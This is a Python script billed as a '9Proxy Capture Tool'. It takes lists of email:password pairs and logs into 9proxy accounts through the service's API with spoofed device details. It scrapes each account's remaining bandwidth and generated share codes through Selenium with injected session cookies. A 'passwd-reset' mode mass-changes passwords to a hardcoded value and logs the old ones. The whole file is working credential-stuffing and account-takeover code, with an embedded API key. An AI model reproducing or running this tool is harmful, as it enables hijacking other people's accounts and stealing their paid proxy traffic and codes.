#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
9Proxy Capture Tool
Author: T.ME/hieunguyen2907
"""

import os
import sys
import io
import time
import json
import uuid
import urllib.parse
import threading
import queue
import re
import logging
import random

logging.disable(logging.CRITICAL)
os.environ['WDM_LOG'] = '0'
os.environ['WDM_LOG_LEVEL'] = '0'
os.environ['WDM_PRINT_FIRST_LINE'] = 'False'

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.text import Text
    import requests
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
except ImportError:
    os.system("pip install selenium webdriver-manager requests rich")
    from rich.console import Console
    from rich.panel import Panel
    from rich.text import Text
    import requests
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC

if sys.stdout.encoding != 'utf-8':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

console = Console()
print_lock = threading.Lock()

USER = "root"
HOST = "hieunguyen-system"
PROMPT = f"[#DCC8FF]{USER}@{HOST}[/#DCC8FF][dim white]:[/dim white][#E0D0FF]~[/#E0D0FF][dim white]$[/dim white]"

C_OK = "#B9FADC"
C_FAIL = "#FFB3C6"
C_WARN = "#FFF0BE"
C_INFO = "#E0D0FF"
C_DIM = "#C8C8C8"
C_ACCENT = "#B4E1FF"
C_GOLD = "#FFD700"

chromedriver_path = None
chromedriver_lock = threading.Lock()

stats = {
    "total": 0, "done": 0,
    "changed": 0, "change_fail": 0, "auth_fail": 0,
    "has_gb": 0, "zero_gb": 0, "has_codes": 0
}
stats_lock = threading.Lock()

NEW_PASSWORD = "Hieudz2907"
CHANGE_PASS_API = "https://w-api-t.9proxy.com/web/module_user/v1/account/change-password?key=X9h5WsQNyA1PS54lGM1eH3jcrcaWY2"


def cmd_print(cmd, delay=0.02):
    console.print(f"{PROMPT} [{C_DIM}]{cmd}[/{C_DIM}]")
    time.sleep(delay)


def sys_print(msg, status="info"):
    colors = {"info": C_INFO, "ok": C_OK, "fail": C_FAIL, "warn": C_WARN}
    c = colors.get(status, C_DIM)
    console.print(f"   [{c}]→[/{c}] {msg}")


def append_result(text, filename):
    with print_lock:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(text + "\n")


def boot_sequence():
    os.system('cls' if os.name == 'nt' else 'clear')
    console.print()
    console.print(f"[{C_DIM}]9Proxy Capture v2.0 — by hieunguyen2907[/{C_DIM}]")
    console.print(f"[{C_DIM}]Session started: {time.strftime('%d/%m/%Y %H:%M:%S')}[/{C_DIM}]")
    console.print()

    cmd_print("./9proxy-tool --init")
    time.sleep(0.2)

    banner = f"""
[#E6D7FF]
                ██████╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗
                ██╔═══██╗██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝
                ╚██████╔╝██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ 
                 ╚═══██║ ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  
                ██████╔╝ ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   
                 ╚═════╝ ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
[/#E6D7FF]
[#FFB3C6]                           ~ hieungguyen2907 ~[/#FFB3C6]
[{C_ACCENT}]               Fast API • Multi-thread • Stealth Mode[/{C_ACCENT}]
"""
    console.print(banner)


def login(email, password):
    url = "https://g-api-t.helloprx.site/shared/module_auth/v2/login"
    device = {
        "ip": f"45.121.{random.randint(1,255)}.{random.randint(1,255)}",
        "city": "Ha Noi", "countryCode": "VN", "countryName": "Vietnam",
        "deviceId": str(uuid.uuid4()), "deviceType": "Desktop",
        "deviceOs": "windows_nt", "deviceDescription": "Windows 10 Pro",
        "platform": "win32", "extraInfo": {"appVersion": "3.1.7.5", "actions": "login"}
    }
    payload = urllib.parse.urlencode({
        'email': email, 'password': password, 'deviceInfo': json.dumps(device)
    })
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded", "Accept": "*/*"
    }
    try:
        r = requests.post(url, headers=headers, data=payload, timeout=15)
        d = r.json()
        if d.get("success"):
            t = d["result"]["tokens"]
            return t["access"]["token"], t["refresh"]["token"], "OK"
        return None, None, "AUTH_FAIL"
    except:
        return None, None, "ERROR"


def change_password_api(access_token, old_password, new_password):
    headers = {
        "User-Agent": "Mozilla/5.0", "Content-Type": "application/json",
        "Authorization": f"Bearer {access_token}",
        "Origin": "https://9proxy.com", "Referer": "https://9proxy.com/"
    }
    try:
        r = requests.post(CHANGE_PASS_API, headers=headers,
                          json={"oldPassword": old_password, "newPassword": new_password}, timeout=15)
        d = r.json()
        return d.get("success", False), "OK" if d.get("success") else "DENIED"
    except:
        return False, "ERROR"


def change_with_retry(email, password, new_password, max_retry=3):
    for _ in range(max_retry):
        acc, _, status = login(email, password)
        if not acc:
            time.sleep(0.3)
            continue
        success, msg = change_password_api(acc, password, new_password)
        if success:
            return True, "OK"
        time.sleep(0.5)
    return False, status if not acc else "DENIED"


def make_driver():
    global chromedriver_path
    opts = Options()
    opts.add_argument("--disable-gpu")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--window-size=1280,720")
    opts.add_argument("--log-level=3")
    opts.page_load_strategy = 'normal'
    opts.add_experimental_option("excludeSwitches", ["enable-logging", "enable-automation"])

    with chromedriver_lock:
        path = chromedriver_path
    try:
        if path:
            svc = Service(path)
        else:
            svc = Service(ChromeDriverManager().install())
            with chromedriver_lock:
                chromedriver_path = svc.path
        svc.log_output = os.devnull
        driver = webdriver.Chrome(service=svc, options=opts)
    except:
        driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(25)
    return driver


def set_cookies(driver, acc_token, ref_token):
    driver.delete_all_cookies()
    if "9proxy.com" not in (driver.current_url or ""):
        driver.get("https://9proxy.com/vi")
        time.sleep(0.5)
    driver.add_cookie({"name": "accessToken", "value": acc_token, "domain": ".9proxy.com", "path": "/"})
    driver.add_cookie({"name": "refreshToken", "value": ref_token, "domain": ".9proxy.com", "path": "/"})


def get_page_email(driver):
    try:
        email_div = driver.find_element(By.CSS_SELECTOR, "div.email")
        spans = email_div.find_elements(By.TAG_NAME, "span")
        if len(spans) >= 2:
            return (spans[0].text.strip() + spans[1].text.strip()).lower()
        return email_div.text.strip().replace(" ", "").replace("\n", "").lower()
    except:
        return ""


def fetch_gb(driver, acc_token, ref_token, expected_email=""):
    result = {"basic": "0.00", "enterprise": "0.00"}

    max_retry = 2
    for attempt in range(max_retry):
        set_cookies(driver, acc_token, ref_token)
        driver.get("https://9proxy.com/vi/dashboard/residential-proxy-gb")

        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "div.email, img[src*='traffic']"))
            )
        except:
            time.sleep(3)

        time.sleep(2)

        if expected_email:
            page_email = get_page_email(driver)
            if page_email and expected_email.lower() not in page_email and page_email not in expected_email.lower():
                driver.delete_all_cookies()
                time.sleep(0.5)
                continue

        js_script = """
        var result = {basic: '0.00', enterprise: '0.00'};
        var allSpans = document.querySelectorAll('span');
        var foundBasicLabel = false;
        var foundEnterpriseLabel = false;
        
        for (var i = 0; i < allSpans.length; i++) {
            var txt = allSpans[i].textContent.trim();
            if (txt === 'Remaining Traffic' || txt === 'Remaining Traffic ') {
                foundBasicLabel = true;
            }
            if (txt === 'Remaining Enterprise Traffic' || txt === 'Remaining Enterprise Traffic ') {
                foundEnterpriseLabel = true;
            }
        }
        
        var imgs = document.querySelectorAll('img');
        for (var i = 0; i < imgs.length; i++) {
            var src = imgs[i].getAttribute('src') || '';
            var container = imgs[i].closest('div[class*="bg-"]') || imgs[i].parentElement;
            if (!container) continue;
            var spans = container.querySelectorAll('span');
            for (var j = 0; j < spans.length; j++) {
                var txt = spans[j].textContent.trim();
                if (/[\\d.]+\\s*GB/.test(txt)) {
                    if (src.indexOf('basic-traffic') !== -1) {
                        result.basic = txt;
                    } else if (src.indexOf('enterprise-traffic') !== -1) {
                        result.enterprise = txt;
                    }
                }
            }
        }
        
        if (result.basic === '0.00' && result.enterprise === '0.00') {
            var gbSpans = [];
            for (var i = 0; i < allSpans.length; i++) {
                var txt = allSpans[i].textContent.trim();
                if (/^[\\d.]+\\s*GB$/.test(txt)) {
                    gbSpans.push(txt);
                }
            }
            if (gbSpans.length >= 1) result.basic = gbSpans[0];
            if (gbSpans.length >= 2) result.enterprise = gbSpans[1];
        }
        
        return JSON.stringify(result);
        """

        try:
            raw = driver.execute_script(js_script)
            data = json.loads(raw)
            for key in ["basic", "enterprise"]:
                m = re.search(r'([\d.]+)', data.get(key, '0.00'))
                if m:
                    result[key] = m.group(1)
        except:
            pass

        break

    return result


def fetch_codes(driver, acc_token, ref_token):
    set_cookies(driver, acc_token, ref_token)
    driver.get("https://9proxy.com/vi/dashboard/share-code?tab=generated-ip-codes")
    time.sleep(2)

    codes = []

    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, ".ant-table-tbody"))
        )

        rows = driver.find_elements(By.CSS_SELECTOR, ".ant-table-tbody tr.ant-table-row")

        for row in rows:
            try:
                cells = row.find_elements(By.CSS_SELECTOR, "td.ant-table-cell")
                if len(cells) >= 7:
                    code_text = cells[1].text.strip()
                    gb_info = cells[2].text.strip()
                    expire_date = cells[3].text.strip()
                    status = cells[4].text.strip()
                    used_date = cells[5].text.strip()
                    used_by = cells[6].text.strip()

                    gb_match = re.search(r'([\d.]+)\s*GB', gb_info)
                    gb = gb_match.group(1) if gb_match else "?"

                    codes.append({
                        "code": code_text,
                        "gb": gb,
                        "expire": expire_date,
                        "status": status,
                        "used_date": used_date,
                        "used_by": used_by
                    })
            except:
                continue

    except Exception:
        pass

    return codes


def worker_change_pass(q, new_password):
    while True:
        try:
            line = q.get_nowait()
        except queue.Empty:
            break

        if ":" not in line:
            q.task_done()
            continue

        email, password = line.split(":", 1)
        short = email.split("@")[0]

        success, msg = change_with_retry(email, password, new_password)

        with stats_lock:
            stats["done"] += 1
            idx = stats["done"]
            total = stats["total"]

        if success:
            with stats_lock:
                stats["changed"] += 1
            append_result(f"{email}:{new_password}", "results_changed.txt")
            append_result(f"{email}:{new_password}|OLD:{password}", "results_backup.txt")
            with print_lock:
                console.print(f"   [{C_DIM}]{idx:>3}/{total}[/{C_DIM}] [{C_OK}]✓[/{C_OK}] {short} [{C_OK}]│ Changed[/{C_OK}]")
        else:
            with stats_lock:
                if msg == "AUTH_FAIL":
                    stats["auth_fail"] += 1
                else:
                    stats["change_fail"] += 1
            with print_lock:
                console.print(f"   [{C_DIM}]{idx:>3}/{total}[/{C_DIM}] [{C_FAIL}]✗[/{C_FAIL}] {short} [{C_FAIL}]│ {msg}[/{C_FAIL}]")

        q.task_done()


def worker_check_gb(q):
    driver = None
    try:
        while True:
            try:
                line = q.get_nowait()
            except queue.Empty:
                break

            if ":" not in line:
                q.task_done()
                continue

            email, password = line.split(":", 1)
            short = email.split("@")[0]

            acc, ref, status = login(email, password)

            with stats_lock:
                stats["done"] += 1
                idx = stats["done"]
                total = stats["total"]

            if not acc:
                with stats_lock:
                    stats["auth_fail"] += 1
                with print_lock:
                    console.print(f"   [{C_DIM}]{idx:>3}/{total}[/{C_DIM}] [{C_FAIL}]✗[/{C_FAIL}] {short} [{C_FAIL}]│ Auth fail[/{C_FAIL}]")
                q.task_done()
                continue

            try:
                if driver is None:
                    driver = make_driver()
                gb_data = fetch_gb(driver, acc, ref, expected_email=email)
            except:
                if driver:
                    try: driver.quit()
                    except: pass
                driver = None
                gb_data = {"basic": "0.00", "enterprise": "0.00"}

            basic = float(gb_data["basic"])
            ent = float(gb_data["enterprise"])
            total_gb = basic + ent

            if total_gb > 0:
                with stats_lock:
                    stats["has_gb"] += 1
                append_result(f"{email}:{password}|Basic:{gb_data['basic']}GB|Enterprise:{gb_data['enterprise']}GB", "results_gb.txt")
                with print_lock:
                    console.print(f"   [{C_DIM}]{idx:>3}/{total}[/{C_DIM}] [{C_OK}]●[/{C_OK}] {short} [{C_OK}]│ {total_gb:.2f} GB[/{C_OK}] [{C_DIM}](B:{gb_data['basic']} E:{gb_data['enterprise']})[/{C_DIM}]")
            else:
                with stats_lock:
                    stats["zero_gb"] += 1
                with print_lock:
                    console.print(f"   [{C_DIM}]{idx:>3}/{total}[/{C_DIM}] [{C_DIM}]○[/{C_DIM}] {short} [{C_DIM}]│ 0.00 GB[/{C_DIM}]")

            q.task_done()
    finally:
        if driver:
            try: driver.quit()
            except: pass


def worker_check_codes(q):
    driver = None
    try:
        while True:
            try:
                line = q.get_nowait()
            except queue.Empty:
                break

            if ":" not in line:
                q.task_done()
                continue

            email, password = line.split(":", 1)
            short = email.split("@")[0]

            acc, ref, status = login(email, password)

            with stats_lock:
                stats["done"] += 1
                idx = stats["done"]
                total = stats["total"]

            if not acc:
                with stats_lock:
                    stats["auth_fail"] += 1
                with print_lock:
                    console.print(f"   [{C_DIM}]{idx:>3}/{total}[/{C_DIM}] [{C_FAIL}]✗[/{C_FAIL}] {short} [{C_FAIL}]│ Auth fail[/{C_FAIL}]")
                q.task_done()
                continue

            try:
                if driver is None:
                    driver = make_driver()
                codes = fetch_codes(driver, acc, ref)
            except:
                if driver:
                    try: driver.quit()
                    except: pass
                driver = None
                codes = []

            if codes:
                with stats_lock:
                    stats["has_codes"] += 1

                total_code_gb = sum(float(c["gb"]) for c in codes if c["gb"] != "?")

                codes_str = "; ".join([f'{c["code"]}({c["gb"]}GB)' for c in codes])
                append_result(f"{email}:{password}|Codes:{len(codes)}|TotalGB:{total_code_gb}|{codes_str}", "results_codes.txt")

                with print_lock:
                    console.print(f"   [{C_DIM}]{idx:>3}/{total}[/{C_DIM}] [{C_GOLD}]★[/{C_GOLD}] {short} [{C_GOLD}]│ {len(codes)} codes ({total_code_gb:.2f} GB)[/{C_GOLD}]")
                    for c in codes[:3]:
                        status_color = C_OK if "Chưa" in c["status"] else C_DIM
                        console.print(f"   [{C_DIM}]      └─[/{C_DIM}] [{C_ACCENT}]{c['code']}[/{C_ACCENT}] [{status_color}]{c['gb']}GB[/{status_color}] [{C_DIM}]{c['status']}[/{C_DIM}]")
                    if len(codes) > 3:
                        console.print(f"   [{C_DIM}]      └─ ...và {len(codes)-3} codes khác[/{C_DIM}]")
            else:
                with print_lock:
                    console.print(f"   [{C_DIM}]{idx:>3}/{total}[/{C_DIM}] [{C_DIM}]○[/{C_DIM}] {short} [{C_DIM}]│ No codes[/{C_DIM}]")

            q.task_done()
    finally:
        if driver:
            try: driver.quit()
            except: pass


def worker_full_check(q):
    driver = None
    try:
        while True:
            try:
                line = q.get_nowait()
            except queue.Empty:
                break

            if ":" not in line:
                q.task_done()
                continue

            email, password = line.split(":", 1)
            short = email.split("@")[0]

            acc, ref, status = login(email, password)

            with stats_lock:
                stats["done"] += 1
                idx = stats["done"]
                total = stats["total"]

            if not acc:
                with stats_lock:
                    stats["auth_fail"] += 1
                with print_lock:
                    console.print(f"   [{C_DIM}]{idx:>3}/{total}[/{C_DIM}] [{C_FAIL}]✗[/{C_FAIL}] {short} [{C_FAIL}]│ Auth fail[/{C_FAIL}]")
                q.task_done()
                continue

            try:
                if driver is None:
                    driver = make_driver()

                gb_data = fetch_gb(driver, acc, ref, expected_email=email)
                basic = float(gb_data["basic"])
                ent = float(gb_data["enterprise"])
                total_gb = basic + ent

                codes = fetch_codes(driver, acc, ref)
                code_count = len(codes)
                code_gb = sum(float(c["gb"]) for c in codes if c["gb"] != "?")

            except:
                if driver:
                    try: driver.quit()
                    except: pass
                driver = None
                total_gb = 0
                code_count = 0
                code_gb = 0
                gb_data = {"basic": "?", "enterprise": "?"}
                codes = []

            parts = []

            if total_gb > 0:
                parts.append(f"[{C_OK}]{total_gb:.2f}GB[/{C_OK}]")
                with stats_lock:
                    stats["has_gb"] += 1
            else:
                parts.append(f"[{C_DIM}]0GB[/{C_DIM}]")
                with stats_lock:
                    stats["zero_gb"] += 1

            if code_count > 0:
                parts.append(f"[{C_GOLD}]{code_count}codes({code_gb:.1f}GB)[/{C_GOLD}]")
                with stats_lock:
                    stats["has_codes"] += 1
            else:
                parts.append(f"[{C_DIM}]0codes[/{C_DIM}]")

            status_icon = "●" if (total_gb > 0 or code_count > 0) else "○"
            status_color = C_OK if (total_gb > 0 or code_count > 0) else C_DIM

            with print_lock:
                console.print(f"   [{C_DIM}]{idx:>3}/{total}[/{C_DIM}] [{status_color}]{status_icon}[/{status_color}] {short} [{C_DIM}]│[/{C_DIM}] {' │ '.join(parts)}")

            if total_gb > 0 or code_count > 0:
                codes_str = ",".join([c["code"] for c in codes]) if codes else "none"
                append_result(f"{email}:{password}|GB:{total_gb}|Codes:{code_count}|CodeGB:{code_gb}|{codes_str}", "results_full.txt")

            q.task_done()
    finally:
        if driver:
            try: driver.quit()
            except: pass


def run_task(lines, num_threads, task_type, new_password=None):
    for key in stats:
        stats[key] = 0
    stats["total"] = len(lines)

    files = {
        "passwd": ["results_changed.txt", "results_backup.txt"],
        "gb": ["results_gb.txt"],
        "codes": ["results_codes.txt"],
        "full": ["results_full.txt"]
    }
    for f in files.get(task_type, []):
        open(f, "w").close()

    console.print()
    console.print(f"   [{C_ACCENT}]{'─' * 55}[/{C_ACCENT}]")
    console.print()

    q = queue.Queue()
    for line in lines:
        q.put(line)

    t_start = time.time()

    workers = {
        "passwd": lambda: worker_change_pass(q, new_password),
        "gb": lambda: worker_check_gb(q),
        "codes": lambda: worker_check_codes(q),
        "full": lambda: worker_full_check(q)
    }

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=workers[task_type], daemon=True)
        t.start()
        threads.append(t)

    q.join()
    elapsed = time.time() - t_start

    console.print()
    console.print(f"   [{C_ACCENT}]{'─' * 55}[/{C_ACCENT}]")
    console.print()

    cmd_print("status --summary")
    console.print()

    if task_type == "passwd":
        console.print(f"   [{C_OK}]✓ Changed[/{C_OK}]    : [{C_OK}]{stats['changed']}[/{C_OK}]")
        console.print(f"   [{C_FAIL}]✗ Denied[/{C_FAIL}]     : [{C_FAIL}]{stats['change_fail']}[/{C_FAIL}]")
        console.print(f"   [{C_WARN}]○ Auth fail[/{C_WARN}]  : [{C_WARN}]{stats['auth_fail']}[/{C_WARN}]")
        if stats['changed'] > 0:
            console.print(f"   [{C_DIM}]─────────────────────[/{C_DIM}]")
            console.print(f"   [{C_OK}]→ results_changed.txt ({stats['changed']})[/{C_OK}]")
    elif task_type == "gb":
        console.print(f"   [{C_OK}]● Has GB[/{C_OK}]     : [{C_OK}]{stats['has_gb']}[/{C_OK}]")
        console.print(f"   [{C_DIM}]○ Empty[/{C_DIM}]      : [{C_DIM}]{stats['zero_gb']}[/{C_DIM}]")
        console.print(f"   [{C_WARN}]✗ Auth fail[/{C_WARN}]  : [{C_WARN}]{stats['auth_fail']}[/{C_WARN}]")
        if stats['has_gb'] > 0:
            console.print(f"   [{C_DIM}]─────────────────────[/{C_DIM}]")
            console.print(f"   [{C_OK}]→ results_gb.txt ({stats['has_gb']})[/{C_OK}]")
    elif task_type == "codes":
        console.print(f"   [{C_GOLD}]★ Has codes[/{C_GOLD}]  : [{C_GOLD}]{stats['has_codes']}[/{C_GOLD}]")
        console.print(f"   [{C_WARN}]✗ Auth fail[/{C_WARN}]  : [{C_WARN}]{stats['auth_fail']}[/{C_WARN}]")
        if stats['has_codes'] > 0:
            console.print(f"   [{C_DIM}]─────────────────────[/{C_DIM}]")
            console.print(f"   [{C_GOLD}]→ results_codes.txt ({stats['has_codes']})[/{C_GOLD}]")
    else:
        console.print(f"   [{C_OK}]● Has GB[/{C_OK}]     : [{C_OK}]{stats['has_gb']}[/{C_OK}]")
        console.print(f"   [{C_GOLD}]★ Has codes[/{C_GOLD}]  : [{C_GOLD}]{stats['has_codes']}[/{C_GOLD}]")
        console.print(f"   [{C_WARN}]✗ Auth fail[/{C_WARN}]  : [{C_WARN}]{stats['auth_fail']}[/{C_WARN}]")
        if stats['has_gb'] > 0 or stats['has_codes'] > 0:
            console.print(f"   [{C_DIM}]─────────────────────[/{C_DIM}]")
            console.print(f"   [{C_OK}]→ results_full.txt[/{C_OK}]")

    console.print(f"   [{C_DIM}]─────────────────────[/{C_DIM}]")
    console.print(f"   [{C_INFO}]⏱ {elapsed:.1f}s ({elapsed/len(lines):.2f}s/acc)[/{C_INFO}]")
    console.print()


def main():
    boot_sequence()

    cmd_print("load --file account.txt")

    if not os.path.exists("account.txt"):
        with open("account.txt", "w", encoding="utf-8") as f:
            f.write("")
        sys_print("Created account.txt → add accounts", "warn")
        return

    with open("account.txt", "r", encoding="utf-8") as f:
        lines = [l.strip() for l in f if l.strip() and ":" in l.strip() and not l.strip().startswith("#")]

    if not lines:
        sys_print("account.txt empty", "fail")
        return

    sys_print(f"Loaded {len(lines)} targets", "ok")
    console.print()

    cmd_print("show modules")
    console.print()
    console.print(f"   [{C_OK}][1][/{C_OK}] [{C_DIM}]check-gb[/{C_DIM}]      → Scan bandwidth")
    console.print(f"   [{C_GOLD}][2][/{C_GOLD}] [{C_DIM}]check-codes[/{C_DIM}]   → Scan generated codes")
    console.print(f"   [{C_ACCENT}][3][/{C_ACCENT}] [{C_DIM}]full-scan[/{C_DIM}]     → GB + Codes (all-in-one)")
    console.print(f"   [{C_WARN}][4][/{C_WARN}] [{C_DIM}]passwd-reset[/{C_DIM}]  → Change password")
    console.print(f"   [{C_FAIL}][0][/{C_FAIL}] [{C_DIM}]exit[/{C_DIM}]")
    console.print()

    try:
        cmd_print("use ", delay=0)
        choice = console.input("").strip()
    except KeyboardInterrupt:
        return

    if choice == "0":
        cmd_print("exit")
        return

    if choice not in ["1", "2", "3", "4"]:
        sys_print("Invalid", "fail")
        return

    console.print()
    default_threads = {"1": 5, "2": 5, "3": 3, "4": 15}
    cmd_print("set threads ", delay=0)
    try:
        inp = console.input("").strip()
        num_threads = max(1, min(20, int(inp))) if inp else default_threads[choice]
    except:
        num_threads = default_threads[choice]

    sys_print(f"Threads: {num_threads}", "ok")

    if choice in ["1", "2", "3"]:
        console.print()
        sys_print("Loading ChromeDriver...", "info")
        global chromedriver_path
        try:
            chromedriver_path = ChromeDriverManager().install()
            sys_print("ChromeDriver ready", "ok")
        except:
            sys_print("Using system Chrome", "warn")

    if choice == "1":
        console.print()
        cmd_print("execute --module check-gb")
        run_task(lines, num_threads, "gb")

    elif choice == "2":
        console.print()
        cmd_print("execute --module check-codes")
        run_task(lines, num_threads, "codes")

    elif choice == "3":
        console.print()
        cmd_print("execute --module full-scan")
        run_task(lines, num_threads, "full")

    elif choice == "4":
        console.print()
        cmd_print("set password ", delay=0)
        try:
            custom_pass = console.input("").strip()
            new_pass = custom_pass if custom_pass else NEW_PASSWORD
        except KeyboardInterrupt:
            return

        sys_print(f"Password: {new_pass}", "ok")
        console.print()

        console.print(f"   [{C_FAIL}]╔══════════════════════════════════════╗[/{C_FAIL}]")
        console.print(f"   [{C_FAIL}]║       ⚠️  DANGER ZONE  ⚠️              ║[/{C_FAIL}]")
        console.print(f"   [{C_FAIL}]║  Overwrite {len(lines):>3} passwords            ║[/{C_FAIL}]")
        console.print(f"   [{C_FAIL}]╚══════════════════════════════════════╝[/{C_FAIL}]")
        console.print()

        cmd_print("confirm --force")
        try:
            confirm = console.input(f"   [{C_FAIL}]Execute? [y/N]: [/{C_FAIL}]").strip().lower()
        except KeyboardInterrupt:
            return

        if confirm != "y":
            sys_print("Aborted", "warn")
            return

        console.print()
        cmd_print("execute --module passwd-reset --force")
        run_task(lines, num_threads, "passwd", new_pass)

    cmd_print("exit")
    sys_print("Session closed", "info")
    console.print()


if __name__ == "__main__":
    main()